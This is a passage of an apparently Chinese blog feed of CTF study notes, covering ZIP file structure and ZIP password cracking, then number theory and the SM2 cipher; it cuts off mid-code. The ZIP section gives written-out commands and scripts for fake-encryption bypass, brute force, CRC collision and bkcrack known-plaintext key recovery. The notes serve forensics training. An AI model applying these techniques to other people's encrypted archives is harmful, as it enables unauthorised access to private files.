<td>值为<code>504B0102</code>，是 ZIP 特有签名</td>
</tr>
<tr class="even">
<td><code>VersionModeBy</code></td>
<td>2</td>
<td>压缩版本</td>
</tr>
<tr class="odd">
<td><code>VersionToExtract</code></td>
<td>2</td>
<td>解压所需最小版本</td>
</tr>
<tr class="even">
<td><code>Flags</code></td>
<td>2</td>
<td>通用标志位</td>
</tr>
<tr class="odd">
<td><code>Compression</code></td>
<td>2</td>
<td>压缩方式</td>
</tr>
<tr class="even">
<td><code>FileTime</code></td>
<td>2</td>
<td>被压缩文件最后修改时间（<code>DOSDATE</code>类型）</td>
</tr>
<tr class="odd">
<td><code>FileDate</code></td>
<td>2</td>
<td>被压缩文件最后修改日期（<code>DOSDATE</code>类型）</td>
</tr>
<tr class="even">
<td><code>Crc</code></td>
<td>4</td>
<td>CRC 校验码</td>
</tr>
<tr class="odd">
<td><code>CompressedSize</code></td>
<td>4</td>
<td>压缩后大小（同时也是 <code>Data</code> 块大小）</td>
</tr>
<tr class="even">
<td><code>UncompressedSize</code></td>
<td>4</td>
<td>文件原始大小（即解压后的大小）</td>
</tr>
<tr class="odd">
<td><code>FileNameLength</code></td>
<td>2</td>
<td>被压缩文件名长度</td>
</tr>
<tr class="even">
<td><code>ExtraFieldLength</code></td>
<td>2</td>
<td>扩展区长度</td>
</tr>
<tr class="odd">
<td><code>FileCommentLength</code></td>
<td>2</td>
<td>文件注释的长度</td>
</tr>
<tr class="even">
<td><code>DiskNumberStart</code></td>
<td>2</td>
<td>文件开始位置的磁盘编号（默认为0）</td>
</tr>
<tr class="odd">
<td><code>InternalAttributes</code></td>
<td>2</td>
<td>内部文件属性</td>
</tr>
<tr class="even">
<td><code>ExternalAttributes</code></td>
<td>4</td>
<td>外部文件属性</td>
</tr>
<tr class="odd">
<td><code>HeaderOffset</code></td>
<td>4</td>
<td>数据区本地文件头相对于压缩包开始位置的偏移量</td>
</tr>
<tr class="even">
<td><code>FileName</code></td>
<td><code>FileNameLength</code></td>
<td>被压缩文件名</td>
</tr>
<tr class="odd">
<td><code>ExtraField</code></td>
<td><code>ExtraFieldLength</code></td>
<td>扩展区数据</td>
</tr>
<tr class="even">
<td><code>Comment</code></td>
<td><code>FileCommentLength</code></td>
<td>注解</td>
</tr>
</tbody>
</table>
<h3 id="zip-尾块zipendlocator">ZIP
尾块（<code>ZIPENDLOCATOR</code>）</h3>
<table>
<colgroup>
<col style="width: 29%">
<col style="width: 22%">
<col style="width: 48%">
</colgroup>
<thead>
<tr class="header">
<th>名字</th>
<th>字节</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Signature</code></td>
<td>4</td>
<td>值为<code>504B0506</code>，是 ZIP 尾特有签名</td>
</tr>
<tr class="even">
<td><code>DiskNumber</code></td>
<td>2</td>
<td>中央目录记录尾部区所在磁盘编号</td>
</tr>
<tr class="odd">
<td><code>StartDiskNumber</code></td>
<td>2</td>
<td>中央目录开始位置所在的磁盘编号</td>
</tr>
<tr class="even">
<td><code>EntriesOnDisk</code></td>
<td>2</td>
<td>该磁盘上所记录的核心目录数量</td>
</tr>
<tr class="odd">
<td><code>EntriesInDirectory</code></td>
<td>2</td>
<td>zip压缩包中的文件总数</td>
</tr>
<tr class="even">
<td><code>DirectorySize</code></td>
<td>4</td>
<td>目录大小</td>
</tr>
<tr class="odd">
<td><code>DirectoryOffset</code></td>
<td>4</td>
<td>目录开始位置的相对偏移量</td>
</tr>
<tr class="even">
<td><code>CommentLength</code></td>
<td>2</td>
<td>注解长度</td>
</tr>
<tr class="odd">
<td><code>Comment</code></td>
<td><code>CommentLength</code></td>
<td>注解</td>
</tr>
</tbody>
</table>
<p>需要注意的是，一个 ZIP 文件只有一个 ZIP
尾块，如果出现多个尾块可能是文件损坏或多文件重合。</p>
<h1 id="zip-破解">ZIP 破解</h1>
<h2 id="伪加密">伪加密</h2>
<h3 id="原理">原理</h3>
<p>在 ZIP 文件中，数据区与目录区中的 <code>Flags</code>
应该是相同的值。当<strong>数据区</strong>的标志位为<strong>加密标志</strong>，而<strong>目录区</strong>的标志位为<strong>非加密标志</strong>时，这个时候许多
ZIP 软件会将其识别为被加密，但实际上并不存在对应的密码。</p>
<h3 id="破解">破解</h3>
<p>只需要将<strong>数据区和目录区的标志位</strong>置为0即可。</p>
<h2 id="弱密码爆破">弱密码爆破</h2>
<h3 id="原理-1">原理</h3>
<p>Deflate
压缩方式的解压速度是十分优秀的，但是这也导致我们进行爆破的效率十分之高。</p>
<h3 id="破解-1">破解</h3>
<p>一般来说推荐使用 ARCHPR 对 ZIP
压缩包进行暴力破解处理。一般是范围内枚举（例如纯数字或数字与字母的排列组合）或是使用专有的字典进行弱密码爆破。</p>
<p>同时也可以使用 hashcat 和 <a href="https://github.com/kimci86/bkcrack">bkcrack</a> 对 ZIP
的密码进行破解。</p>
<h4 id="section"></h4>
<h2 id="crc-碰撞">CRC 碰撞</h2>
<h3 id="原理-2">原理</h3>
<p>当压缩文件内容较少或仅有部分明文未知时，可以采用 CRC
碰撞的方式去暴力破解明文（因为压缩包中保存的 CRC
校验值为压缩前内容的校验）。</p>
<h3 id="破解-2">破解</h3>
<p>可以使用 Python
脚本进行爆破，但下面的脚本仅是示例，如果有特别的需求（例如未知明文在已知明文中间段时）需要自行修改脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRCcrack</span>(<span class="params">unknownBytes: <span class="built_in">int</span>, targetCRC: <span class="built_in">int</span>, known: <span class="built_in">bytes</span> = <span class="string">b&#x27;&#x27;</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    CRC 碰撞</span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        unknownBytes - 未知的字节数</span></span><br><span class="line"><span class="string">        known - 已知明文（默认为拼接）</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        完整明文</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">128</span>), repeat=unknownBytes):</span><br><span class="line">        msg = known + <span class="built_in">bytes</span>(m)</span><br><span class="line">        crc = binascii.crc32(msg)</span><br><span class="line">        <span class="keyword">if</span> crc == targetCRC:</span><br><span class="line">            rst.append(msg)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(CRCcrack(<span class="number">3</span>, binascii.crc32(<span class="string">b&#x27;123&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<p>如果仅是碰撞，我们可以使用 GitHub 上的开源项目（<a href="https://github.com/theonlypwner/crc32">CRC32 Tools</a>）</p>
<p>使用方法：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0</span>x4FA83D8C</span><br></pre></td></tr></table></figure>
<p>需要注意的是，因为 CRC-32 是哈希算法的一种，所以可能会存在多个明文的
CRC-32 值相等。</p>
<h2 id="明文攻击">明文攻击</h2>
<h3 id="原理-3">原理</h3>
<p>ZIP
加密模式本质上是将密码转化为内置的一个密钥进行加密的，而密钥是有限长度的，所以如果我们知道一个压缩包内其中一个文件的完整明文，那么我们就可以通过算法将密钥百分百地计算出来（理论上可以把密码也百分百计算出来），且理论上破解速度只与被压缩文件大小有关。</p>
<h3 id="破解-3">破解</h3>
<p>推荐使用 ARCHPR
的明文攻击模式进行破解，需要一个明文压缩包和含有明文文件的密文压缩包，其中他们的压缩算法应该是相同的。</p>
<p>同时也可以使用 <a href="https://github.com/kimci86/bkcrack">bkcrack</a> 进行破解。</p>
<h3 id="注意">注意</h3>
<ul>
<li>文本文件如果编码不同（例如 <code>UTF-8</code> 与
<code>GBK</code>）可能导致压缩出来的大小不同，所以各种编码都需要尝试一次。</li>
<li>不同的压缩软件压缩出来的文件可能会导致 ARCHPR 报错，一般推荐
Bandizip 与 WinRAR 都尝试一次。</li>
</ul>
<h2 id="深入明文攻击">深入明文攻击</h2>
<h3 id="原理-4">原理</h3>
<p>ZIP
加密模式本质上是将密码转化为内置的一个密钥进行加密的，而密钥是有限长度的，而且
ZIP
的加密方式使得我们可以只解密部分密文，如果我们知道某个文件的部分密文，那么我们可以遍历所有可能的密钥去进行比对（类似
CRC 碰撞的原理）。</p>
<p>但仅有 ZipCrypto Deflate 算法和 ZipCrypto Store
算法可以用此方式破解。</p>
<h3 id="破解-4">破解</h3>
<p>使用 <a href="https://github.com/kimci86/bkcrack">bkcrack</a>
需要已知明文的十二个字节和偏移，其中八个字节必须连续。</p>
<p>需要使用到的参数：</p>
<table>
<thead>
<tr class="header">
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-C file.zip</code></td>
<td>加密压缩包</td>
</tr>
<tr class="even">
<td><code>-c file</code></td>
<td>提取的密文文件（密文部分）</td>
</tr>
<tr class="odd">
<td><code>-p key.txt</code></td>
<td>指定明文部分</td>
</tr>
<tr class="even">
<td><code>-x offset hex</code></td>
<td>指定偏移量和部分明文十六进制值</td>
</tr>
<tr class="odd">
<td><code>-o offset</code></td>
<td>指定明文部分的偏移量</td>
</tr>
<tr class="even">
<td><code>-k key1 key2 key3</code></td>
<td>指定三段解密密钥</td>
</tr>
<tr class="odd">
<td><code>-d file</code></td>
<td>解压缩得到的目标文件</td>
</tr>
</tbody>
</table>
<p>例如针对 JPG 的压缩包，我们可以使用以下命令：</p>
<p>首先生成明文文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;FFD8FFE000104A4649460001&quot;</span> | xxd -r -ps &gt; key.txt</span><br></pre></td></tr></table></figure>
<p>随后进行密钥爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bkcrack -C 1.zip -c t.jpg -p key.txt -o 0</span><br></pre></td></tr></table></figure>
<p>或者是针对 ZIP 的压缩包，我们可以使用以下命令：</p>
<p>首先我们这个 ZIP 中存在 flag.txt 的明文：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;flag.txt&quot;</span> &gt; key.txt</span><br></pre></td></tr></table></figure>
<p>其次我们知道 ZIP 文件的头，故进行密钥爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bkcrack -C 1.zip -c flag.zip -p key.txt -o 30 -x 0 504B03041400</span><br></pre></td></tr></table></figure>
<p>需要注意的是，当已知字节数越多时，得到的密钥越准确。</p>
<p>得到三段密钥后我们进行提取：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bkcrack -C 1.zip -c flag.zip -k 683a571e f954e70c 49da18ac -d 111.zip</span><br></pre></td></tr></table></figure>
<p>需要注意的是，如果文件是使用 Deflate
算法进行压缩的话，需要使用其自带的 <code>inflate.py</code> 脚本（在
<code>./tools/</code> 文件夹中）进行解压缩：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python inflate.py &lt; 1.jpg &gt; 2.jpg</span><br></pre></td></tr></table></figure>
<h1 id="特殊实例">特殊实例</h1>
<h2 id="以时间戳作为密码">以时间戳作为密码</h2>
<h3 id="原理-5">原理</h3>
<p>时间戳一般是一个两位小数，ZIP
文件所保存的创建时间和更新时间并不一定与当时所获取的时间戳是一致的，也许会差几秒，所以我们需要先将文件创建时间转化为时间戳，然后进行掩码爆破。</p>
<h3 id="破解-5">破解</h3>
<p>例如文件创建时间为
<code>2019/05/17 8:25:28</code>，我们使用如下脚本进行转化时间戳</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">a = time.struct_time((<span class="number">2019</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">25</span>,<span class="number">28</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(time.mktime(a))</span><br></pre></td></tr></table></figure>
<p>得到结果 <code>1558052728.0</code>，设置掩码
<code>15580?????.??</code> 或者 <code>15580?????.?</code> 爆破即可。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title>数论知识笔记</title>
    <url>//number-theory-note.html</url>
    <content><![CDATA[<h1 id="数论知识笔记">数论知识笔记</h1>
<h2 id="pell-方程">Pell 方程</h2>
<p>Pell 方程是指形如 <span class="math display">\[
x^2-Dy^2=1
\]</span> 的二元二次方程，主要研究的是满足这个方程的整数解 <span class="math inline">\((x_i,y_i)\)</span> 和最小整数解 <span class="math inline">\((x_0,y_0)\)</span>。</p>
<p>通常我们使用连分数来求解其整数解，将 <span class="math inline">\(\sqrt{D}\)</span> 写成连分数的形式，即 <span class="math display">\[
\sqrt{D}=[a_0;a_1,a_2,\cdots,a_{n-1},a_n]
\]</span> 如果 Pell 方程有解，总会找到 <span class="math inline">\(a_n\)</span> 满足 <span class="math inline">\(a_i=2a_0\)</span>，那么连分数 <span class="math display">\[
[a_0;a_1,a_2,\cdots,a_{n-1}]
\]</span> 可能是 Pell 方程的一组解 <span class="math display">\[
\frac{x}{y}=[a_0;a_1,a_2,\cdots,a_{n-1}]
\]</span> sagemath 求解代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D = <span class="number">1117</span></span><br><span class="line">interval = <span class="number">200</span></span><br><span class="line">cf = continued_fraction(sqrt(D))</span><br><span class="line">a0 = cf[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(interval):</span><br><span class="line">    <span class="keyword">if</span> a0 * <span class="number">2</span> == cf[i]:</span><br><span class="line">        c = cf.convergent(i - <span class="number">1</span>)</span><br><span class="line">        x, y = c.as_integer_ratio()</span><br><span class="line">        <span class="keyword">if</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>((x, y))</span><br></pre></td></tr></table></figure>
<h2 id="卡迈尔数">卡迈尔数</h2>
<p>卡迈尔数是指一系列合数（相对于质数）<span class="math inline">\(n\)</span> 有得性质：使所有与 <span class="math inline">\(n\)</span> 互素的整数 <span class="math inline">\(b\)</span>，满足 <span class="math display">\[
b^{n-1}\equiv1\pmod{n}
\]</span>
费马小定理说明所有的质数都有这个性质，所以卡迈尔数也被称作<strong>伪质数</strong>。</p>
<p>同时由于这些数的存在，使得费马质性检验变得不可靠。</p>
<p>一个简单的卡迈尔数为，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">29674495668685510550154174642905332730771991799853043350995075531276838753171770199594238596428121188033664754218345562493168782883</span></span><br><span class="line">N = p * (<span class="number">313</span> * (p - <span class="number">1</span>) + <span class="number">1</span>) * (<span class="number">353</span> * (p - <span class="number">1</span>) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="拓展欧几里得算法">拓展欧几里得算法</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extendedGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="comment"># a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = extendedGCD(b, a % b)</span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以使用 <code>gmpy2.gcdext(a, b)</code> 替代，返回三元元组 <span class="math inline">\((g,s,t)\)</span></p>
<p>其中<span class="math inline">\(g=\gcd(a, b)=sa+tb\)</span></p>
</blockquote>
<p>存在相关性的定理：裴蜀定理。</p>
<p>裴蜀定理说明了对任意整数 <span class="math inline">\(a,b\)</span>
和它们的最大公约数 <span class="math inline">\(\gcd{(a,b)}=d\)</span>，那么对任意整数 <span class="math inline">\(x,y\)</span> 都有 <span class="math inline">\(ax+by\)</span> 为 <span class="math inline">\(d\)</span> 的倍数，即 <span class="math display">\[
ax+by=0\pmod{d}
\]</span> 特别地，一定存在整数使得 <span class="math inline">\(ax+by=d\)</span> 成立。</p>
<p>一个重要推论为，<span class="math inline">\(a,b\)</span>
互质的充分必要条件为存在整数 <span class="math inline">\(x,y\)</span>
使得 <span class="math inline">\(ax+by=1\)</span>。</p>
<h2 id="欧拉函数">欧拉函数</h2>
<ul>
<li><p>如果<span class="math inline">\(p\)</span>是素数且<span class="math inline">\(k\geq 1\)</span>，则 <span class="math display">\[
\phi (p^k)=p^k-p^{k-1}
\]</span> 特别地，当<span class="math inline">\(k=1\)</span>时，表达式即为 <span class="math display">\[
\phi (p)=p-1
\]</span></p></li>
<li><p>如果<span class="math inline">\(gcd(m, n)=1\)</span>，即<span class="math inline">\(m,n\)</span>互质，则 <span class="math display">\[
\phi (mn)=\phi (m)\phi (n)
\]</span></p></li>
</ul>
<p>其中与之相关的有欧拉公式：</p>
<p>对任意两个互素整数 <span class="math inline">\(a,n\)</span>，有 <span class="math display">\[
a^{\varphi(n)}=1\pmod{n}
\]</span></p>
<h2 id="中国剩余定理">中国剩余定理</h2>
<p>设<span class="math inline">\(m\)</span>与<span class="math inline">\(n\)</span>是整数，<span class="math inline">\(gcd(m,n)=1\)</span>，<span class="math inline">\(b\)</span>与<span class="math inline">\(c\)</span>是任意整数，则同余式组 <span class="math display">\[
x\equiv b\ (mod\ m)\ 与\ x\equiv c\ (mod\ n)
\]</span> 恰有一个解 <span class="math inline">\(0\leq x\leq
mn\)</span></p>
<p>详细内容可以在<a href="/CRT-note.html">这里</a>了解</p>
<h2 id="威尔逊定理">威尔逊定理</h2>
<p>威尔逊定理给出了判定一个自然数是否为素数的充分必要条件：</p>
<p>当且仅当 <span class="math inline">\(p\)</span> 为素数时，有 <span class="math display">\[
(p-1)!\equiv-1\pmod{p}
\]</span> 或推论 <span class="math display">\[
(p-1)!+1=0\pmod{p}
\]</span> 即 <span class="math inline">\((p-1)!+1\)</span> 为 <span class="math inline">\(p\)</span> 的倍数。</p>
<p>一般用于辅助推导，相关的有伽马函数 <span class="math display">\[
\Gamma(n)=(n-1)!
\]</span></p>
<h2 id="费马小定理">费马小定理</h2>
<p>如果 <span class="math inline">\(p\)</span> 是一个素数，取任意的非
<span class="math inline">\(p\)</span> 整数 <span class="math inline">\(a\)</span>，有 <span class="math display">\[
a^{p-1}\equiv1\pmod{p}
\]</span> 推论有： <span class="math display">\[
na^{p-1}\equiv n\pmod{p},n\in\Z\\
a^{p-2}\equiv a^{-1}\pmod{p}\\
a^b\equiv a^{b\pmod{p-1}}\pmod{p},b\in\Z\\
\]</span></p>
<h2 id="数学黑洞">数学黑洞</h2>
<h3 id="黑洞">123 黑洞</h3>
<h4 id="算法">算法</h4>
<ol type="1">
<li>取一个任意数字串，数出这个数中的偶数个数、奇数个数和总数字个数</li>
<li>将结果按 <code>偶数个数-奇数个数-总数字个数</code> 排列得到新数</li>
<li>对新数重复步骤 1、2，最终总会得到数字 123</li>
</ol>
<h4 id="实例">实例</h4>
<ol type="1">
<li>取数字串 1234567890，其中偶数个数为 <strong>5</strong>
(2、4、6、8、0)，奇数个数为 <strong>5</strong>
(1、3、5、7、9)，总数字个数为 <strong>10</strong></li>
<li>得到新数 <strong>5510</strong></li>
<li>重复步骤，得到新数 <strong>134</strong></li>
<li>重复步骤，得到新数 <strong>123</strong></li>
</ol>
<h4 id="其他">其他</h4>
<p><strong>123
数学黑洞</strong>（又被称为<strong>西西弗斯串</strong>），由中国回族学者秋屏先生严格证明，并且推广到六个类似的数字：<strong>123</strong>、<strong>213</strong>、<strong>312</strong>、<strong>321</strong>、<strong>132</strong>、<strong>231</strong></p>
<h3 id="kaprekars-routine-kaprekar-常数">Kaprekar's routine (Kaprekar
常数)</h3>
<h4 id="算法-1">算法</h4>
<ol type="1">
<li>取一个任意数字串，将数字串中的数字从大到小排列得到最大值，将数字串中的数字从小到大排列得到最小值</li>
<li>令最大值减最小值，得到新数</li>
<li>新数重复步骤 1、2，最终会得到 Kaprekar 不动点（Kaprekar 常数）</li>
</ol>
<h4 id="实例-1">实例</h4>
<p>当取的任意数字串基于十进制，且为四位数时：</p>
<ol type="1">
<li>取数字串 3524，得到最大值 <strong>5432</strong>，得到最小值
<strong>2345</strong></li>
<li>最大值减最小值，得到新值 <strong>3087</strong></li>
<li>重复步骤，最大值 <strong>8730</strong> 减最小值
<strong>0378</strong>，得到新值 <strong>8352</strong></li>
<li>重复步骤，最大值 <strong>8532</strong> 减最小值
<strong>2358</strong>，得到新值 <strong>6174</strong></li>
<li>重复步骤，最大值 <strong>7641</strong> 减最小值
<strong>1467</strong>，得到新值 <strong>6174</strong></li>
<li>故当任意数串基于十进制，且为四位数时，Kaprekar 不动点（Kaprekar
常数）为 <strong>6174</strong></li>
</ol>
<p>当取的任意数串基于十进制，且为三位数时，Kaprekar 不动点（Kaprekar
常数）为 <strong>495</strong></p>
<blockquote>
<p>需要注意的是，当位数不足的时候需要补足前导零</p>
</blockquote>
<h4 id="其他-1">其他</h4>
<p>实际上，Kaprekar
常数在不同进制下的不同数位中是不同的，我们统一将其称为 Kaprekar
常数。</p>
<p>更多详情可以参考 <a href="https://en.wikipedia.org/wiki/Kaprekar%27s_routine">https://en.wikipedia.org/wiki/Kaprekar%27s_routine</a></p>
<h3 id="自幂数">自幂数</h3>
<h4 id="算法-2">算法</h4>
<p>取一个共 n 位的数，将各个位上的数的 n
次方相加，得到的累加和结果跟原数相等，我们就称这个数为<strong>自幂数</strong>。</p>
<h4 id="实例-2">实例</h4>
<p>当取 3
位数时，这样的<strong>自幂数</strong>称为<strong>水仙花数</strong>。</p>
<p>例如，取数字 135，各个位上的数的 3 次方分别为 1、27、125，累加和为
135，即跟原数相等。</p>
<p>这样的数只有 135、370、371、407。</p>
<p>除此之外，4
位数的<strong>自幂数</strong>称为<strong>玫瑰花数</strong>，这样数有
1634、8208、9474；5
位数的<strong>自幂数</strong>称为<strong>五角星数</strong>，这样数有
54748、92727、93084</p>
<h3 id="冰雹猜想">冰雹猜想</h3>
<h4 id="算法-3">算法</h4>
<p>任取一个正整数 <strong>N</strong>，让它按照以下规则不断递推：</p>
<ul>
<li>如果这个数是奇数，则下一步变为 3<strong>N</strong>+1</li>
<li>如果这个数是偶数，则下一步变为 <strong>N</strong>/2</li>
</ul>
<p>无论是什么正整数，最终都会使得结果变为 1</p>
<h4 id="实例-3">实例</h4>
<p>冰雹的最大魅力在于不可预知性。</p>
<p>英国剑桥大学教授 John Conway 找到了一个自然数 27。虽然 27
是一个貌不惊人的自然数，但是如果按照上述方法进行运算，则它的上浮下沉异常剧烈：首先，27
要经过 77 步骤的变换到达顶峰值 9232，然后又经过 32 步骤到达谷底值
1。全部的变换过程（称作“雹程”）需要 111 步，其顶峰值
9232，达到了原有数字 27 的 342 倍多，如果以瀑布般的直线下落（2 的 N
次方）来比较，则具有同样雹程的数字 N 要达到 2 的 111 次方。</p>
<p>这个结果是极其惊人的！因为在1到100的范围内，像 27
这样的剧烈波动是没有的（54等27的2的次方倍数的数除外）。</p>
<h4 id="其他-2">其他</h4>
<p>冰雹猜想又叫 Collatz
conjecture，之所以翻译为冰雹猜想，是因为这样一个序列像冰雹一样经历多次上升和下降。</p>
<p>同时也被称作角谷猜想，这是因为是一个叫角谷的日本人将这个猜想传入中国的。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>SM系列算法</title>
    <url>//sm-series-note.html</url>
    <content><![CDATA[<h1 id="sm-系列算法">SM 系列算法</h1>
<h2 id="sm2">SM2</h2>
<p>SM2 是椭圆曲线公钥密码算法，是基于 ECC 的非对称加密，又称作
SM2-ECDSA，主要应用于数字签名。</p>
<p>国密算法标准中推荐使用的默认值为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF</span></span><br><span class="line">n = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span></span><br><span class="line">a = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC</span></span><br><span class="line">b = <span class="number">0x28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93</span></span><br><span class="line">Gx = <span class="number">0x32C4AE2C1F1981195F9904466A39C9948FE30BBFF2660BE1715A4589334C74C7</span></span><br><span class="line">Gy = <span class="number">0xBC3736A2F4F6779C59BDCEE36B692153D0A9877CC62A474002DF32E52139F0A0</span></span><br></pre></td></tr></table></figure>
<p>其中 <span class="math inline">\(p\)</span> 为有限域规模，<span class="math inline">\((a,b)\)</span> 为椭圆曲线参数，<span class="math inline">\(n\)</span> 为这个椭圆曲线的阶数，<span class="math inline">\(G(G_x,G_y)\)</span> 为基点。</p>
<p>国密标准规范来源：<a href="https://www.sca.gov.cn/sca/xxgk/2010-12/17/content_1002386.shtml">https://www.sca.gov.cn/sca/xxgk/2010-12/17/content_1002386.shtml</a></p>
<h3 id="sm2公钥加密算法">SM2公钥加密算法</h3>
<h4 id="符号">符号</h4>
<p><span class="math inline">\(klen\)</span> 指代消息长度，<span class="math inline">\(M\)</span> 指代消息，标准推荐 <span class="math inline">\(\mathrm{KDF}\)</span> 使用 SM3 算法，标准推荐
<span class="math inline">\(\mathrm{Hash}\)</span> 使用 SM3
算法（输出必须为 32 字节），<span class="math inline">\(||\)</span>
表示比特串拼接。</p>
<h4 id="公钥与密钥">公钥与密钥</h4>
<ul>
<li>私钥 <span class="math inline">\(d\)</span> 是 32 byte（256
bit）的随机数</li>
<li>公钥 <span class="math inline">\(P=d\cdot G\)</span></li>
</ul>
<h4 id="加密">加密</h4>
<ol type="1">
<li>产生随机数 <span class="math inline">\(k\in[1,n-1]\)</span></li>
<li>计算椭圆曲线点 <span class="math inline">\(C_1(x_1,y_1)=k\cdot
G\)</span></li>
<li>计算椭圆曲线点 <span class="math inline">\(k\cdot
P=(x_2,y_2)\)</span></li>
<li>计算 <span class="math inline">\(t=\mathrm{KDF}(x_2||y_2,klen)\)</span>，如果 <span class="math inline">\(t\)</span> 全为 0 比特串，则回到步骤一重新选取
<span class="math inline">\(k\)</span></li>
<li>计算椭圆曲线点 <span class="math inline">\(C_2=M\oplus
t\)</span></li>
<li>计算椭圆曲线点 <span class="math inline">\(C_3=\mathrm{Hash}(x_2||M||y_2)\)</span></li>
<li>输出密文 <span class="math inline">\(C=C_1||C_2||C_3\)</span></li>
</ol>
<figure>
<img src="/sm-series-note/SM2公钥加密算法.png" alt="SM2公钥加密算法">
<figcaption aria-hidden="true">SM2公钥加密算法</figcaption>
</figure>
<h4 id="解密">解密</h4>
<ol type="1">
<li>从密文中获取 <span class="math inline">\(C_1\)</span>，验证 <span class="math inline">\(C_1\)</span>
是否满足曲线方程，不满足则报错推出</li>
<li>计算椭圆曲线点 <span class="math inline">\(dC_1=(x_2,y_2)\)</span></li>
<li>计算 <span class="math inline">\(t=\mathrm{KDF}(x_2||y_2,klen)\)</span>，如果 <span class="math inline">\(t\)</span> 全为 0 比特串，则报错退出</li>
<li>计算 <span class="math inline">\(M&#39;=C_2\oplus t\)</span></li>
<li>计算 <span class="math inline">\(u=\mathrm{Hash}(x_2||M&#39;||y_2)\)</span>，验证
<span class="math inline">\(u=C_3\)</span>，不正确则报错退出</li>
<li>输出明文 <span class="math inline">\(M&#39;\)</span></li>
</ol>
<figure>
<img src="/sm-series-note/SM2公钥解密算法.png" alt="SM2公钥解密算法">
<figcaption aria-hidden="true">SM2公钥解密算法</figcaption>
</figure>
<h4 id="代码">代码</h4>
<p>基于 Sagemath 的椭圆曲线的运算代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> overload, <span class="type">Union</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sage.rings.finite_rings.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.schemes.elliptic_curves.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">default_p = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF</span></span><br><span class="line">default_n = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span></span><br><span class="line">default_a = <span class="number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC</span></span><br><span class="line">default_b = <span class="number">0x28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93</span></span><br><span class="line">default_Gx = <span 